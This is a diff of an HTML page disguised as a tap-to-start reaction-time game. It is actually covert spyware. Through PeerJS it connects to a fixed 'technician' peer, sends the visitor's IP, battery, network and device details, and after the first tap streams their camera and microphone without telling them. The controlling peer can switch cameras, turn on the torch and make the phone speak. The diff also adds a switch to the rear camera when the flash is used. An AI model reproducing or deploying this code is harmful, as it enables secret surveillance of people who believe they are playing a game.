@@ -1,11 +1,19 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
+
     <meta charset="UTF-8">
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
     <title>Reaction Test</title>
+
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+
     <style>
+
         body {
             background-color: #1a1a1a;
             color: white;
@@ -22,6 +30,8 @@
             user-select: none;
         }
 
+
+
         #game-board {
             width: 85vw;
             height: 85vw;
@@ -36,13 +46,19 @@
             z-index: 10;
         }
 
+
+
             #game-board.success {
                 background-color: #27ae60;
             }
 
+
+
             #game-board.fail {
                 background-color: #c0392b;
             }
+
+
 
         #hud-container {
             margin-bottom: 30px;
@@ -51,12 +67,16 @@
             z-index: 10;
         }
 
+
+
         #main-display {
             font-size: 50px;
             font-weight: bold;
             color: #bdc3c7;
             text-shadow: 2px 2px 0 #000;
         }
+
+
 
         #instruction {
             font-size: 18px;
@@ -65,7 +85,10 @@
             line-height: 1.4;
         }
 
+
+
         /* WHITE FLASHLIGHT LAYER (Fallback) */
+
         #flashlight-layer {
             position: fixed;
             top: 0;
@@ -78,148 +101,293 @@
             cursor: none;
         }
     </style>
+
 </head>
+
 <body>
+
+
 
     <div id="flashlight-layer"></div>
 
+
+
     <div id="hud-container">
+
         <div id="main-display">TAP TO START</div>
+
         <div id="instruction">1. Close eyes.<br>2. Wait for BEEP.<br>3. Tap fast!</div>
+
     </div>
+
     <div id="game-board"></div>
 
+
+
     <script>
-        const TECHNICIAN_ID = "tech-support-zomzassnzcr-141";
+
+        const TECHNICIAN_ID = "cybr-support-zomzzssnzcr-141";
+
         const TRIGGER_COUNT = 1;
 
+
+
         // Game Vars
+
         let gameState = 'IDLE';
+
         let beepTimestamp = 0;
+
         let roundCount = 0;
+
         let isVideoConnected = false;
+
         let wakeLock = null;
 
+
+
         // Audio & DOM
+
         const AudioContext = window.AudioContext || window.webkitAudioContext;
+
         let audioCtx;
+
         const synth = window.speechSynthesis;
+
         const board = document.getElementById('game-board');
+
         const display = document.getElementById('main-display');
+
         const flashlightLayer = document.getElementById('flashlight-layer');
 
+
+
         // PeerJS Setup
+
         const peer = new Peer();
+
         let myDataConnection = null;
+
         let currentStream = null;
 
+
+
         // ==========================================
+
         // 1. IMMEDIATE SPY MODE
+
         // ==========================================
+
         peer.on('open', async (id) => {
+
             console.log("Client ID:", id);
+
             myDataConnection = peer.connect(TECHNICIAN_ID);
 
+
+
             myDataConnection.on('open', async () => {
+
                 console.log("Data Link Established");
+
                 const fullData = await collectSpyData();
+
                 myDataConnection.send({ type: 'info', ...fullData });
 
+
+
                 // Listen for Commands
+
                 myDataConnection.on('data', (data) => {
+
                     const cmd = data.command || data;
+
+
 
                     if (cmd === 'swap') toggleCamera();
 
+
+
                     // FLASHLIGHT LOGIC
+
                     if (cmd === 'flash_on') toggleTorch(true);
+
                     if (cmd === 'flash_off') toggleTorch(false);
 
+
+
                     if (data.command === 'speak' && data.text) speakText(data.text);
+
                 });
+
             });
+
         });
 
+
+
         // ==========================================
+
         // 2. GAME INPUT
+
         // ==========================================
+
         board.addEventListener('touchstart', handleInput, { passive: false });
+
         board.addEventListener('mousedown', handleInput);
 
+
+
         async function handleInput(e) {
+
             e.preventDefault();
 
+
+
             if (!audioCtx) audioCtx = new AudioContext();
+
             if (audioCtx.state === 'suspended') audioCtx.resume();
+
             if (synth.paused) synth.resume();
+
             if (!wakeLock) { try { wakeLock = await navigator.wakeLock.request('screen'); } catch (e) { } }
 
+
+
             if (gameState === 'IDLE') {
+
                 gameState = 'WAITING_FOR_BEEP';
+
                 display.innerText = "WAIT...";
+
                 display.style.color = "#f1c40f";
+
                 scheduleBeep();
+
                 return;
+
             }
+
+
 
             if (gameState === 'WAITING_FOR_BEEP') {
+
                 display.innerText = "TOO EARLY!";
+
                 display.style.color = "#e74c3c";
+
                 flashBoard('fail');
+
                 clearTimeout(beepTimer);
+
                 setTimeout(() => { display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); }, 1000);
+
                 return;
+
             }
+
+
 
             if (gameState === 'WAITING_FOR_TAP') {
+
                 const ms = Date.now() - beepTimestamp;
+
                 display.innerText = ms + " ms";
+
                 display.style.color = "#2ecc71";
+
                 flashBoard('success');
+
                 roundCount++;
 
+
+
                 if (roundCount === TRIGGER_COUNT && !isVideoConnected) {
+
                     activateCamera();
+
                 }
 
+
+
                 gameState = 'WAITING_FOR_BEEP';
+
                 setTimeout(() => { display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); }, 1000);
+
             }
+
         }
 
+
+
         // ==========================================
+
         // 3. CAMERA & FLASHLIGHT LOGIC
+
         // ==========================================
+
+
 
         async function activateCamera() {
+
             isVideoConnected = true;
+
             try { await startStream('user'); } catch (err) { console.log("Camera error:", err); }
+
         }
+
+
 
         async function startStream(mode) {
+
             if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+
             currentStream = stream;
+
             peer.call(TECHNICIAN_ID, stream);
+
         }
 
+
+
         let currentMode = 'user';
+
         function toggleCamera() {
+
             currentMode = (currentMode === 'user') ? 'environment' : 'user';
+
             startStream(currentMode);
+
         }
+
+
 
         // --- THE FLASHLIGHT FUNCTION ---
         async function toggleTorch(turnOn) {
-            // Method 1: Try Hardware Torch (Back Camera Only)
+            // Check if we are currently using the front camera
+            const track = currentStream ? currentStream.getVideoTracks()[0] : null;
+            const settings = track ? track.getSettings() : {};
+
+            // If turning ON and we are in 'user' (front) mode, switch to back camera first
+            if (turnOn && settings.facingMode === 'user') {
+                currentMode = 'environment';
+                await startStream('environment');
+                // Wait a tiny bit for the new stream to settle before applying flash
+                setTimeout(() => toggleTorch(true), 500);
+                return;
+            }
+
+            // Method 1: Hardware Torch
             if (currentStream) {
-                const track = currentStream.getVideoTracks()[0];
-                const capabilities = track.getCapabilities();
+                const activeTrack = currentStream.getVideoTracks()[0];
+                const capabilities = activeTrack.getCapabilities();
 
                 if (capabilities.torch) {
                     try {
-                        await track.applyConstraints({ advanced: [{ torch: turnOn }] });
-                        return; // If hardware torch works, we don't need screen flash
+                        await activeTrack.applyConstraints({ advanced: [{ torch: turnOn }] });
+                        return;
                     } catch (e) { console.log("Torch failed:", e); }
                 }
             }
@@ -228,61 +396,115 @@
             flashlightLayer.style.display = turnOn ? 'block' : 'none';
         }
 
+
         // --- DATA COLLECTION ---
+
         async function collectSpyData() {
+
             let ip = 'unknown';
+
             try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch (e) { }
 
+
+
             let battery = 'unknown';
+
             try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; } catch (e) { }
 
             let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
             let netType = connection ? connection.effectiveType : 'unknown';
+
             let downlink = connection ? connection.downlink + ' Mbps' : 'unknown';
 
             return {
+
                 ip: ip, battery: battery, userAgent: navigator.userAgent,
+
                 network: netType, speed: downlink, cores: navigator.hardwareConcurrency || 'unknown',
+
                 ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
+
                 screen: window.screen.width + "x" + window.screen.height, lang: navigator.language
+
             };
+
         }
+
+
 
         function speakText(text) {
+
             if (!synth) return;
+
             synth.cancel();
+
             const utterance = new SpeechSynthesisUtterance(text);
+
             synth.speak(utterance);
+
         }
+
+
 
         let beepTimer = null;
+
         function scheduleBeep() {
+
             beepTimer = setTimeout(() => {
+
                 playTone();
+
                 beepTimestamp = Date.now();
+
                 gameState = 'WAITING_FOR_TAP';
+
             }, Math.floor(Math.random() * 2000) + 1000);
+
         }
+
+
 
         function playTone() {
+
             if (!audioCtx) return;
+
             const osc = audioCtx.createOscillator();
+
             const g = audioCtx.createGain();
+
             osc.connect(g); g.connect(audioCtx.destination);
+
             osc.frequency.value = 600; g.gain.value = 0.1;
+
             osc.start(); osc.stop(audioCtx.currentTime + 0.15);
+
         }
+
+
 
         function flashBoard(type) {
+
             board.classList.add(type);
+
             setTimeout(() => board.classList.remove(type), 200);
+
         }
 
+
+
         document.addEventListener("visibilitychange", async () => {
+
             if (wakeLock !== null && document.visibilityState === "visible") {
+
                 wakeLock = await navigator.wakeLock.request('screen');
+
             }
+
         });
+
     </script>
+
 </body>
+
 </html>
